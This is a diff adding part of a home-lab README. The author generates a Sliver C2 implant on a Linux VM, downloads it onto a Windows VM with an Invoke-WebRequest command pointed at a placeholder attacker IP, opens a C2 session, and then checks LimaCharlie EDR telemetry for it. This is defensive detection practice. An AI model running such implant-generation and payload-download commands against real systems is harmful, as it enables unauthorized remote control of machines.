@@ -105,3 +105,36 @@ Next was back to the attack system. I had to download sliver Linux server binary
 ![Screenshot (11)](https://github.com/user-attachments/assets/d40b7860-deff-4c72-8783-067de2f4313d)
 
 ## Part 2 
+generating C2 payload is next. I opened sliver server and entered the following command to generate payload:
+
+generate --http [Linux_VM_IP] --save /opt/sliver
+
+I also entered the command "implants" to confirm the implant configuration
+
+![Screenshot (14)](https://github.com/user-attachments/assets/6be2b68a-9a64-4246-9c1d-2d05de389dcb)
+
+Then I went back to the windows VM to download the C2 payload. In the windows command I entered the following command:
+
+IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
+
+
+![Screenshot (15)](https://github.com/user-attachments/assets/6df9c14b-8cd7-4b60-ae17-414003419d7c)
+
+Next is to start the command and control session. I went to the linux VM and enetered the command "http" which is the listener. In the wiundows VM, enter the download location of the executable (C:\Users\User\Downloads\<your_C2-implant>.exe) and the linux VM will pick it up.
+
+
+![Screenshot (17)](https://github.com/user-attachments/assets/413b4899-32a1-4bcc-a790-3b5ef7d3889c)
+
+I entered the "use" command to interact with the C2 session. Now that the linux VM is linked with the Windows, I went to Lima charlie to examine the EDR telemetry and to see if the C2 implant was present.
+
+
+![Screenshot (19)](https://github.com/user-attachments/assets/98a6d627-e8a9-426b-8eb5-4bf4c50ed02f)
+
+I also observed the timeline that shows window event logs(WEL) and EDR telemetry (NETWORK_CONNECTIONS)
+
+
+![Screenshot (20)](https://github.com/user-attachments/assets/57a508ca-8069-493c-a930-6a9290061431)
+
+##PART 3
+
+
